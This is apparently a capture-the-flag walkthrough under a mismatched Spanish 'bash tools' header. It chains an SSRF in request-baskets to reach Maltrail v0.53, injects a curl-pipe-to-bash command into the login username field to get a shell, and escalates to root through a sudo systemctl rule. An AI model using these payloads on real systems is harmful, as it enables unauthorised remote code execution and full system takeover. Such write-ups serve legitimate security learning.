# Bash-Scripting


herraientas hechas en bash para aprender mas sobre leguaje de comandos
Create a basket like so:

POST /api/baskets/lol
```{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}```
Then visit http://<ip>:55555/lol

You will see Maltrail (v0.53)
https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

Now create another basket:

POST /api/baskets/lol2
```{"forward_url": "http://127.0.0.1:80/login","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}```
Then send a post request to http://<ip>:55555/lol2 with payload like so:

```username=;`curl <local_ip>/shell | bash`'```
this will get you shell as puma after that just run sudo -l, you wil see:

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

https://gtfobins.github.io/gtfobins/systemctl/#sudo
Get root by just running  ```sudo /usr/bin/systemctl status trail.service
!sh```
